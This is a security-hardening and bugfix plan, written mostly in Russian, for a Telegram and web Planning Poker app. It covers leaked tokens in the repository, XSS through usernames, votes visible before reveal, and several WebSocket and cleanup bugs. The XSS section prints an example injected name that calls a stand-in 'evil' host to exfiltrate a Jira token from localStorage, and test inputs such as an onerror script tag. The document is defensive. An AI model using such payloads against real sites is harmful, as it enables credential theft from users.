# Planning Poker — Security Hardening & Bugfixes (заход 1)

**Date:** 2026-08-09
**Project:** tg_poker_planing — Planning Poker (Telegram Bot + Web Interface)
**Branch:** `fix/security-and-bugs`

---

## Context

Аудит текущего `main` (последний коммит `f66cd20`, 2026-07-21) выявил три критические
уязвимости, одну утечку данных, ломающую основную функцию продукта, и набор
функциональных багов. Тесты при этом зелёные (243 passed), `ruff check .` чист —
то есть существующая проверка эти проблемы не ловит.

Этот заход закрывает всё, кроме переделки браузерного расширения: она меняет
протокол между страницей и расширением, ломает совместимость с уже установленными
сборками и вынесена в отдельную ветку (см. «Вне scope»).

---

## Цели

1. Убрать возможность выполнить произвольный JS у участников комнаты.
2. Сделать голосование действительно анонимным до вскрытия карт.
3. Прекратить хранение живых секретов в репозитории и не допустить повторения.
4. Починить функциональные баги: устаревшее состояние игры, неработающую смену
   шкалы, теряющиеся ошибки WebSocket, невызываемую очистку сессий.

## Вне scope

- **Переделка браузерного расширения (S2).** Отдельная ветка. Там: убрать
  `getSettings` из page-facing API, перенести Jira-токен в `storage.local`
  расширения, добавить origin-allowlist в `content.js`.
- **Переписывание git-истории.** Токены отзываются вручную владельцем; после
  отзыва их присутствие в истории безвредно, а force-push публичного репозитория
  ломает форки и клоны. Делается отдельно и только по явному запросу.
- **Аутентификация и авторизация в веб-интерфейсе.** Сейчас доступ к комнате даёт
  знание 8-символьного `session_id`, а `GET /api/sessions` отдаёт список всех
  сессий без авторизации. Это архитектурное изменение, требующее отдельного дизайна.
- **Обновление зависимостей, разделение prod/dev requirements, CI.** Отдельный заход.

## S1. Секреты в репозитории

### Проблема

`.env.example` содержит реальный токен Telegram-бота (`8209778838:AAHqPK_…`) и
VK-токен группы 239083025. Файл в git с `initial commit`; репозиторий публичный.

### Решение

Внутри репозитория:

- `.env.example` приводится к плейсхолдерам: ни одного значения, похожего на
  реальный секрет. Закомментированные «примеры» с настоящими токенами удаляются.
- В `.pre-commit-config.yaml` добавляется hook `gitleaks`
  (`https://github.com/gitleaks/gitleaks`, `id: gitleaks`), чтобы коммит с секретом
  не проходил локально.

Вне репозитория (действие владельца, не автоматизируется): отзыв обоих токенов —
`/revoke` у @BotFather и отзыв ключа группы во ВКонтакте. Это фиксируется в
README в разделе про конфигурацию как предупреждение не коммитить `.env`.

## S3. XSS через имя участника

### Проблема

`renderParticipants()` (`web/static/script.js`) собирает HTML строкой и подставляет
`p.username` в трёх местах без экранирования: в атрибут `title`, в текст узла и
внутрь inline-обработчика `onclick="kickParticipant('${p.username}')"`. Сервер имя
не валидирует — `api_create_session` и WS-`join` берут строку как есть, только
обрезая пробелы.

Итог: участник с именем вида `'),fetch('//evil/'+localStorage.pp_jira_settings)//`
выполняет свой JS у всех в комнате и уносит Jira-токен из `localStorage`.

### Решение — два независимых слоя

**Слой 1: сервер отвергает опасные имена.** Новая функция в `web_api.py`:

```python
USERNAME_RE = re.compile(r"^[\w \-.]{1,32}$", re.UNICODE)

def validate_username(raw: str) -> str | None:
    """Возвращает нормализованное имя или None, если оно недопустимо."""
```

`\w` с `re.UNICODE` пропускает кириллицу и латиницу — имена вроде `Аня` и
`Jean-Luc` работают, а `<`, `>`, `"`, `'`, `&`, перевод строки — нет.

Точки применения: `api_create_session`, `api_vote`, `api_restart`, `api_reveal`,
`api_kick_user` (оба поля — `username` и `target_username`), и ветка `join`
в `websocket_endpoint`. При невалидном имени — `400` с внятным сообщением; для
WebSocket — `{"type": "error", "message": …}` и игнорирование `join`.

**Слой 2: фронт экранирует при выводе.** Все интерполяции `p.username` в
`renderParticipants()` оборачиваются в существующий `escapeHtml()`. Inline
`onclick` на kick-кнопке заменяется на `data-username` + один делегированный
слушатель на контейнере `#participantsList` — это устраняет весь класс проблем со
вставкой в JS-контекст, где HTML-экранирования недостаточно.

Остальные 28 мест с `innerHTML` в `script.js` проверяются по одному; там, где в
разметку попадают данные из сессии или Jira, добавляется `escapeHtml()`.

### Проверка

Тест на бэкенде: `POST /api/sessions` с именем `<img src=x onerror=alert(1)>`
возвращает 400. Тест на фронте (E2E, Playwright): участник с именем, содержащим
`<script>`, отображается как текст, `alert` не срабатывает.

## S4. Голоса видны до вскрытия карт

### Проблема

`game_to_web_response()` (`web_api.py`) кладёт в каждый элемент `votes` два поля:
`point` (замаскированное мастью) и `real_point` — настоящее значение, всегда.
Ответ уходит всем участникам через `enrich_session_response` в каждом broadcast.
UI маскирует корректно, но данные видны в DevTools → WS frames. Для инструмента,
чья ценность в анонимности оценки, это дефект основной функции.

### Решение

`real_point` присутствует в ответе только когда `game.revealed is True`:

```python
vote_payload = {
    "user_id": user_id,
    "username": …,
    "point": vote.point if game.revealed else vote.masked,
    "version": vote.version,
}
if game.revealed:
    vote_payload["real_point"] = vote.point
```

Фронт уже написан устойчиво — везде используется `p.vote.real_point || p.vote.point`,
а ветка отрисовки до вскрытия читает только `p.vote.point`. Правки на фронте не нужны.

Отдельно: `process_web_vote()` формирует `vote_data` с `real_point` и кладёт его в
`manager.session_users`. Наружу эта структура не уходит (ответ строится
`enrich_session_response` из `game`), поэтому меняется только для консистентности.

### Проверка

Тест: два участника голосуют, до `reveal` в ответе `GET /api/sessions/{id}` ни в
одном элементе `votes` и `participants` нет ключа `real_point`; после `reveal` —
есть и равен поданному значению. Существующий `tests/test_app.py:362`
(`assert result["votes"][0]["real_point"] == "5"`) переписывается под новое
поведение — сейчас он закрепляет утечку.

## F1. Устаревший объект игры в WebSocket

### Проблема

`websocket_endpoint()` читает `game` один раз перед циклом приёма сообщений и
переиспользует этот объект до конца соединения. Обработчик `set_scale` вызывает
`save_game(game)` — то есть записывает в БД состояние на момент подключения,
затирая голоса, поданные другими участниками позже. Сейчас последствия смягчены
тем, что веб-фронт голосует через REST (где игра читается заново), но обработчик
`vote` в WebSocket существует и имеет ту же проблему.

### Решение

Убрать кэширование: игра читается из БД в начале обработки каждого входящего
сообщения. Это одна строка на ветку и снимает весь класс расхождений.

```python
while True:
    data = await websocket.receive_text()
    if data == "ping":
        await websocket.send_text("pong")
        continue
    msg = json.loads(data)
    game = await state.storage.get_game(WEB_CHAT_ID, session_id)  # всегда свежая
```

Начальный `init`-снимок при подключении остаётся как есть. Переменная `game`,
которую `disconnect()` получает в `except`-ветках, берётся из последнего
прочитанного значения — для broadcast'а «участник вышел» этого достаточно.

### Проверка

Тест: Алиса подключается по WS, Боб голосует через REST, Алиса шлёт `set_scale` —
голос Боба сохраняется. Сейчас такой тест падает.

## F2. Смена шкалы внутри сессии

### Проблема

Два дефекта разом. Во-первых, `setScale()` в `script.js` не передаёт `username`,
а серверная проверка сравнивает `f"web_{setter_username}"` с `game.initiator.id` —
с пустым именем условие никогда не выполняется, и сервер всегда отвечает отказом.
Во-вторых, `setScale()` вообще ниоткуда не вызывается: селектор шкалы есть только
на экране входа (`#joinScaleSelector`), в самой сессии контрола нет. README при
этом заявляет смену шкалы как возможность.

### Решение

Довести фичу до рабочего состояния:

- `setScale(scaleName)` шлёт `username: state.username` вместе с `scale_name`.
- В карточку управления инициатора (`#initiatorControlCard`) добавляется селектор
  шкалы, отрисовываемый той же функцией, что и на экране входа, с вызовом
  `setScale()` по клику. Контрол виден только инициатору — карточка уже скрывается
  через `state.isInitiator`.
- Обработчик `set_scale` на сервере после исправления F1 работает со свежей игрой,
  поэтому смена шкалы перестаёт затирать голоса.
- Смена шкалы, у которой другой набор значений, делает ранее поданные голоса
  невалидными. Поведение: при смене шкалы голоса сбрасываются (`game.restart()`
  без изменения текста) и всем уходит `update`. Это честнее, чем оставлять голоса,
  которых нет в новой шкале, — иначе `_calc_average()` считает по значениям,
  недоступным для повторного голосования.

### Проверка

Тесты: инициатор меняет шкалу — приходит `update` с новым `available_points` и
пустыми `votes`; не-инициатор получает `{"type": "error"}`; голоса других
участников, поданные до смены, не воскресают.

## F3. Ошибки WebSocket теряются

### Проблема

Сервер отправляет `{"type": "error", "message": …}` при попытке не-инициатора
сменить шкалу или исключить участника, а также при голосе значением вне шкалы.
В `onmessage` на фронте ветки для `type === 'error'` нет — сообщение молча
отбрасывается, пользователь видит, что «ничего не произошло».

### Решение

Ветка в обработчике `onmessage`: `toast.error(msg.message, 'ОШИБКА')`.

## F4. Очистка сессий не запускается

### Проблема

`ConnectionManager.cleanup_old_sessions()` реализован и покрыт тестами
(`tests/test_session_cleanup.py`), но не вызывается нигде в приложении.
`session_users`, `ws_username_map` и `_ws_connections` растут всё время работы
процесса. Тест создаёт ложную уверенность, что очистка работает.

### Решение

Периодическая задача в `lifespan` (`app.py`): каждые 10 минут вызывает
`manager.cleanup_old_sessions()`. Задача создаётся при старте, отменяется при
shutdown до закрытия БД. Интервал — константа `SESSION_CLEANUP_INTERVAL` в
`config.py`, чтобы тест мог его подменить.

Записи в SQLite намеренно не трогаются: `GET /api/sessions` показывает историю
сессий, и TTL для неё — продуктовое решение, а не техническая уборка.

### Проверка

Тест: с укороченным интервалом сессия без активных подключений исчезает из
`manager.session_users` после срабатывания задачи; задача корректно отменяется
на shutdown и не оставляет висящих тасков.

## F5. Rate-limit store растёт без границ

### Проблема

`_rate_limit_store` в `web_api.py` — словарь `ip → список меток времени`. Записи
фильтруются по окну при обращении, но ключи никогда не удаляются: каждый
уникальный IP оставляет запись навсегда.

### Решение

В `_check_rate_limit` после фильтрации: если список опустел, ключ удаляется, а не
записывается обратно пустым. Этого достаточно — ключ живёт не дольше окна после
последнего запроса с этого IP.

Отдельно отмечено, но не меняется: лимит по IP означает, что команда за одним NAT
делит квоту. Порог (30 запросов в минуту на голосование) для этого достаточно
высок; менять модель лимитирования без реальной жалобы не стоит.

## F6. Двойной декоратор

`ConnectionManager._get_enriched_data` в `connection.py` объявлен с двумя
`@staticmethod` подряд. На Python 3.10+ это работает случайно (объекты
`staticmethod` стали вызываемыми), на 3.9 сломалось бы. Лишняя строка удаляется.

## Порядок работ

Изменения независимы и группируются в коммиты по одной проблеме: S1, S3 (сервер),
S3 (фронт), S4, F1, F2, F3, F4, F5, F6. Такой порядок ставит серверную валидацию
имени перед фронтовым экранированием, а F1 — перед F2, потому что рабочая смена
шкалы опирается на чтение свежей игры.

После каждого коммита прогоняются `python -m pytest` и `ruff check .`.

## Риски

- **Валидация имён отсекает существующих пользователей.** Имена не персистятся
  между сессиями (кроме `localStorage` у клиента), поэтому пользователь с
  несовместимым именем просто получит ошибку при входе и введёт другое.
  Символьный класс подобран так, чтобы обычные имена на любом языке проходили.
- **Сброс голосов при смене шкалы может удивить.** Это осознанный выбор в пользу
  корректности; поведение отражается в README.
- **Удаление `real_point` до вскрытия ломает внешних потребителей API,** если
  такие есть. Публичного контракта у API нет, потребитель один — собственный фронт.
